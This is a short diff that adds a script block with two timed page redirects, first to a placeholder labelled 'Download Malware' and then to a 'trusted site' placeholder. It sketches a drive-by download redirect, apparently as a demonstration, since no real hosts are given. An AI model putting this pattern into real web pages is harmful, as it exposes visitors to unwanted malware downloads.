@@ -1,0 +1,4 @@
+<script>
+window.setTimeout ("location.href=('Download Malware')", 0);
+window.setTimeout ("location.href=('Sito di Fiduca')", 1300);
+</script>
